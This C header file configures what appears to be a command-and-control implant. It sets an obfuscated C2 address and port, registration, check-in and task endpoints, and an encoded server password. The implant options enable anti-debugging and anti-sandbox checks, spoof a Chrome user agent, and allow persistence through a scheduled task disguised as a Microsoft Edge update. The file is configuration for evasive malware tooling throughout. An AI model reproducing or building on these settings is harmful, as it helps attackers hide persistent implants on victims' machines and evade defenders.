#ifndef CONSTANTS_H_
#define CONSTANTS_H_

#include "obfuscator/MetaString.h"

#ifndef DEBUG
#define DEBUG 0
#endif


#define C2_URL OBFUSCATED("localhost")
#define C2_PORT 80
#define USE_TLS FALSE


/****************************************/
/*            C2 endpoints              */
/****************************************/
#define TASK_RESULTS_ENDPOINT OBFUSCATED("/c2/task")
#define REGISTER_ENDPOINT OBFUSCATED("/c2/register")
#define CHECKIN_ENDPOINT OBFUSCATED("/c2/checkin")



/****************************************/
/*            Implant settings          */
/****************************************/
#define INITIAL_SLEEP_SECONDS 180
#define REGISTER_MAX_RETRIES 5
#define SCHTASK_PERSIST FALSE
#define USE_ANTIDEBUG TRUE
#define USE_ANTISANDBOX TRUE
#define C2_REGISTER_PASSWORD OBFUSCATED("SWh5bHhGOENYQWF1TW9KR3VTb0YwVkVWbDRud1RFaHc=")  // Base64 encoded server auth password
#define REGISTER_USER_AGENT OBFUSCATED("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36")
#define SCHEDULED_TASK_NAME OBFUSCATED("MicrosoftEdgeUpdateTaskMachineUA")


/****************************************/
/*           Actual constants           */
/****************************************/
#define CONTENT_TYPE_JSON OBFUSCATED("Content-Type: application/json")

#endif // CONSTANTS_H_